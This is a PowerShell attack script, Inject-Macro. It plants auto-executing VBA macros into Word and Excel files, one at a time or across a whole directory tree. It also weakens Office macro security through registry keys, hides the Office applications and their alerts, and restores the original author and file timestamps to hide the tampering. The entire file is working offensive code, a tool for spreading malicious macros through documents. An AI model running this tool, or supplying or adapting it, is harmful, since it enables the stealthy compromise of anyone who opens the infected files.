function Inject-Macro {
[CmdletBinding()] Param(
	[Parameter(Mandatory = $False)]
	[String]
	$Doc,

	[Parameter(Mandatory = $False)]
	[String]
	$Macro,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Infect = $False,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Clean = $False
)

	function Inject ([String] $Doc, [String] $Macro, [Switch] $Self, [Switch] $Clean) {
		# Excel document handling
		if ($Doc -like '*.xls') {
			# Create Excel objects
			Add-Type -AssemblyName Microsoft.Office.Interop.Excel
			$EXCEL = New-Object -ComObject Excel.Application
			$EXCEL.AutomationSecurity = 'msoAutomationSecurityForceDisable'
			$ExcelVersion = $EXCEL.Version

			# Disable macro security
			Registry-Switch -Format excel -State disable

			$EXCEL.DisplayAlerts = 'wdAlertsNone'
			$EXCEL.DisplayAlerts = $False
			$EXCEL.Visible = $False
			$EXCEL.ScreenUpdating = $False
			$EXCEL.UserControl = $False
			$EXCEL.Interactive = $False

			# Get original document metadata
			$LAT = $($(Get-Item $Doc).LastAccessTime).ToString('M/d/yyyy h:m tt')
			$LWT = $($(Get-Item $Doc).LastWriteTime).ToString('M/d/yyyy h:m tt')

			$Book = $EXCEL.Workbooks.Open($Doc, $Null, $Null, 1, "")
			$Author = $Book.Author

			if ($Clean) {
				# Remove VBA macros
				ForEach ($Module in $Book.VBProject.VBComponents) {
					if ($Module.Name -like "Module*") {
						$Book.VBProject.VBComponents.Remove($Module)
					}
				}
			} elseif ($Self) {
				$VBA = $Book.VBProject.VBComponents.Add(1)
				$VBA.CodeModule.AddFromFile($Macro) | Out-Null

				$RemoveMetadata = 'Microsoft.Office.Interop.Excel.XlRemoveDocInfoType' -as [type]
				$Book.RemoveDocumentInformation($RemoveMetadata::xlRDIAll)
			} else {
				$VBA = $Book.VBProject.VBComponents.Add(1)
				$VBA.CodeModule.AddFromFile($Macro) | Out-Null

				$Book.Author = $Author
			}

			# Save the document
			$Book.SaveAs("$Doc", [Microsoft.Office.Interop.Excel.xlFileFormat]::xlExcel8)
			$EXCEL.Workbooks.Close()

			if (($Clean) -or ($Self)) {
				# Enable macro security
				Registry-Switch -Format excel -State enable
			} else {
				# Re-write original document metadata
				$(Get-Item $Doc).LastAccessTime = $LAT
				$(Get-Item $Doc).LastWriteTime = $LWT

				# Write to file for clean up
				$Doc | Add-Content $env:temp'\inject.log'
			}

			# Exit Excel
			$EXCEL.Quit()
			[System.Runtime.Interopservices.Marshal]::ReleaseComObject($EXCEL) | out-null
			$EXCEL = $Null

			if (PS excel) {
				kill -name excel
			}
		# Word document handling
		} else {
			# Create Word objects
			Add-Type -AssemblyName Microsoft.Office.Interop.Word
			$WORD = New-Object -ComObject Word.Application
			$WORD.AutomationSecurity = 'msoAutomationSecurityForceDisable'
			$WordVersion = $WORD.Version

			# Disable macro security
			Registry-Switch -Format word -State disable

			$WORD.DisplayAlerts = [Microsoft.Office.Interop.Word.wdAlertLevel]::wdAlertsNone
			$WORD.Visible = $False
			$WORD.ScreenUpdating = $False

			# Get original document metadata
			$LAT = $($(Get-Item $Doc).LastAccessTime).ToString('M/d/yyyy h:m tt')
			$LWT = $($(Get-Item $Doc).LastWriteTime).ToString('M/d/yyyy h:m tt')

			$Book = $WORD.Documents.Open($Doc, $False, $False, $False, "")

			if ($Clean) {
				# Remove VBA macros (for some reason Word is weird)
				$Count = 1
				ForEach ($Module in $Book.VBProject.VBComponents) {
					if ($Module.Name -like "Module*") {
						$CodeModule = $Book.VBProject.VBComponents.Item($Count).CodeModule
						$LineCount = $CodeModule.CountOfLines
						if ($LineCount -gt 0) {
							$CodeModule.DeleteLines(1, $LineCount)
						}
					}
					$Count = $($Count + 1)
				}
			} elseif ($Self) {
				$VBA = $Book.VBProject.VBComponents.Add(1)
				$VBA.CodeModule.AddFromFile($Macro) | Out-Null

				$RemoveMetadata = 'Microsoft.Office.Interop.Word.WdRemoveDocInfoType' -as [type]
				$Book.RemoveDocumentInformation($RemoveMetadata::wdRDIAll)
			} else {
				$VBA = $Book.VBProject.VBComponents.Add(1)
				$VBA.CodeModule.AddFromFile($Macro) | Out-Null
			}

			# Save the document
			$Book.SaveAs([REF]"$Doc")
			$Book.Close()

			if (($Clean) -or ($Self)) {
				# Enable macro security
				Registry-Switch -Format word -State enable
			} else {
				# Re-write original document metadata
				$(Get-Item $Doc).LastAccessTime = $LAT
				$(Get-Item $Doc).LastWriteTime = $LWT

				# Write to file for clean up
				$Doc | Add-Content $env:temp'\inject.log'
			}

			# Exit Word
			$WORD.Application.Quit()
			[System.Runtime.Interopservices.Marshal]::ReleaseComObject($WORD) | out-null
			$WORD = $Null

			if (PS winword) {
				kill -name winword
			}
		}
	}

	# Handle enabling and disabling VBA security registry keys
	function Registry-Switch ([String] $Format, [String] $State) {
		if ($Format -eq 'excel') {
			$EXCEL = New-Object -ComObject Excel.Application
			$ExcelVersion = $EXCEL.Version
			$RegPath = "$ExcelVersion\Excel"
		} else {
			$WORD = New-Object -ComObject Word.Application
			$WordVersion = $WORD.Version
			$RegPath = "$WordVersion\Word"
		}
		
		$AccessValue = (Get-ItemProperty HKCU:\Software\Microsoft\Office\$RegPath\Security).AccessVBOM
		$WarningValue = (Get-ItemProperty HKCU:\Software\Microsoft\Office\$RegPath\Security).VBAWarnings
		
		if ($State -eq 'enable') {
			if (($AccessValue -ne 0) -or ($WarningValue -ne 0)) {
				New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$RegPath\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
				New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$RegPath\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
			}
		} elseif ($State -eq 'disable') {
			if (($AccessValue -ne 1) -or ($WarningValue -ne 1)) {
				New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$RegPath\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
				New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$RegPath\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
			}
		}
	}

	# Resolve full paths
	if ($Doc -and $Macro) {
		$Doc = (Resolve-Path $Doc).Path
		$Macro = (Resolve-Path $Macro).Path
	}

	# Actually do things...
	if ($PSBoundParameters['Clean']) {
		if (Test-Path $env:temp'\inject.log' -PathType Leaf) {
			Get-Content $env:temp'\inject.log' | Foreach-Object {
				$Doc = $_
				Inject $Doc -Clean
				Write-Host "Macro removed from $Doc"
			}
			Remove-Item $env:temp'\inject.log'
			Write-Host 'Injected macros have been removed from all documents' -foregroundcolor green
		} else {
			Write-Host 'Could not find inject.log file!' -foregroundcolor red
			break
		}
	} elseif ($PSBoundParameters['Infect']) {
		if (Test-Path $Doc -pathType container) {
			# Get first line of VBA code
			$VBAStart = (Get-Content $Macro -totalcount 1).ToLower()
			if ($VBAStart -match 'auto_open') {
				Write-Host 'Injecting Excel documents with macro...'
				$Documents = Get-ChildItem -Path $Doc -include *.xls -recurse
			} elseif ($VBAStart -match 'autoopen') {
				Write-Host 'Injecting Word documents with macro...'
				$Documents = Get-ChildItem -Path $Doc -include *.doc -recurse
			} else {
				Write-Host "Could not find 'Sub Auto_Open()' or 'Sub AutoOpen()' in macro file!" -foregroundcolor red
				break
			}
			ForEach ($Document in $Documents) {
				try {
					Inject $Document $Macro
					Write-Host "Macro sucessfully injected into $Document"
				} catch {
					continue
				}
			}
			Write-Host 'Macro has been injected into all documents' -foregroundcolor green
		} else {
			Write-Host 'Please provide a valid directory path!' -foregroundcolor red
			break
		}
	} elseif (Test-Path $Doc -PathType Leaf) {
		Inject $Doc $Macro -Self
		Write-Host "Macro sucessfully injected into $Doc"
		Write-Warning 'Remember, the injected VBA macro is NOT password protected!'
	} else {
		Write-Host 'Please provide a valid .xls or .doc file!' -foregroundcolor red
	}
}